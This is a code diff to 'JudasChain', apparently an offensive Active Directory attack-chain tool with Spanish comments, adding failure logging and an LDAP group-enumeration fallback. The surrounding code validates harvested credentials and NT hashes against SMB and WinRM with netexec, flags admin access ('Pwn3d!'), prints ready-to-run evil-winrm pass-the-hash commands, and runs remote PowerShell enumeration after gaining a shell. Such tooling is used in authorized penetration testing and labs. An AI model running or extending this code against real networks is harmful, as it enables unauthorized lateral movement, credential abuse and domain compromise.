@@ -818,6 +818,9 @@ class JudasChain:
                 if "Pwn3d!" in out:
                     ctx.admin_smb.append((user, password))
                     log_ok(f"  → ADMIN SMB (Pwn3d!)")
+            else:
+                # FIX #9: reportar explícitamente el fallo, no quedar en silencio
+                log_warn(f"SMB ✗  {user} → credenciales rechazadas")
 
             if 5985 in ctx.open_ports or 5986 in ctx.open_ports:
                 out2, _, _ = self.r.run(
@@ -826,6 +829,8 @@ class JudasChain:
                 if "[+]" in out2:
                     ctx.valid_winrm.append((user, password))
                     log_ok(f"WinRM ✓  {user}:{password}")
+                else:
+                    log_warn(f"WinRM ✗  {user} → acceso denegado")
 
             time.sleep(0.5)
 
@@ -845,6 +850,8 @@ class JudasChain:
                     if "Pwn3d!" in out:
                         ctx.admin_smb.append((user, f"HASH:{nthash}"))
                         log_ok(f"  → ADMIN PTH (Pwn3d!)")
+                else:
+                    log_warn(f"PTH ✗  {user} → hash rechazado")
 
                 if 5985 in ctx.open_ports or 5986 in ctx.open_ports:
                     out2, _, _ = self.r.run(
@@ -853,6 +860,8 @@ class JudasChain:
                     if "[+]" in out2:
                         ctx.valid_winrm.append((user, f"HASH:{nthash}"))
                         log_ok(f"WinRM PTH ✓  {user}")
+                    else:
+                        log_warn(f"WinRM PTH ✗  {user} → acceso denegado")
 
                 time.sleep(0.5)
 
@@ -862,6 +871,9 @@ class JudasChain:
                 log_ok(f"\n  evil-winrm -i {ctx.target_ip} -u {u} -H {p[5:]}")
             else:
                 log_ok(f"\n  evil-winrm -i {ctx.target_ip} -u {u} -p '{p}'")
+        elif not ctx.valid_smb and not ctx.valid_pth:
+            # FIX #9: dejar explícito que ninguna credencial autenticó en ningún protocolo
+            log_warn("Ninguna credencial validó en SMB/WinRM — revisar permisos o LAPS/BloodHound")
 
         ctx.phase_done.append("validate")
         ctx.save()
@@ -901,6 +913,41 @@ class JudasChain:
         log_step("Ejecutando enumeración post-shell (1 conexión)...")
         combined = remote(f"powershell -Command \"{ps_script}\"")
         self.r.save("post_enum_combined.txt", combined)
+
+        # FIX #8: detectar fallo de ejecución remota (-x) y avisar en vez de
+        # dejar "Grupos clave: []" sin explicación en el resumen final.
+        exec_failed = (
+            "---WHOAMI---" not in combined
+            or "STATUS_ACCESS_DENIED" in combined
+            or "Execution failed" in combined
+        )
+        if exec_failed:
+            log_warn(f"Ejecución remota (-x) falló para {user} — probablemente sin "
+                     f"permisos para ejecutar comandos (solo bind/lectura LDAP). "
+                     f"Intentando fallback de grupos vía LDAP...")
+            qu_f = shlex.quote(user)
+            qd_f = shlex.quote(ctx.domain)
+            if nthash:
+                ldap_out, _, _ = self.r.run(
+                    f"netexec ldap {ctx.dc_ip} -u {qu_f} -H {shlex.quote(nthash)} "
+                    f"-d {qd_f} --groups 2>/dev/null"
+                )
+            else:
+                ldap_out, _, _ = self.r.run(
+                    f"netexec ldap {ctx.dc_ip} -u {qu_f} -p {shlex.quote(password)} "
+                    f"-d {qd_f} --groups 2>/dev/null"
+                )
+            self.r.save("ldap_groups_fallback.txt", ldap_out)
+            fallback_lines = [
+                l.strip() for l in ldap_out.splitlines()
+                if l.strip() and "[*]" not in l and "[+]" not in l and "[-]" not in l
+            ]
+            if fallback_lines:
+                log_info(f"Grupos vía LDAP (fallback, {len(fallback_lines)}):")
+                for l in fallback_lines[:15]:
+                    log_info(f"  {l}")
+            else:
+                log_warn("Fallback LDAP tampoco devolvió grupos legibles con esta cuenta")
 
         wa_start = combined.find("---WHOAMI---")
         nu_start = combined.find("---NETUSER---")
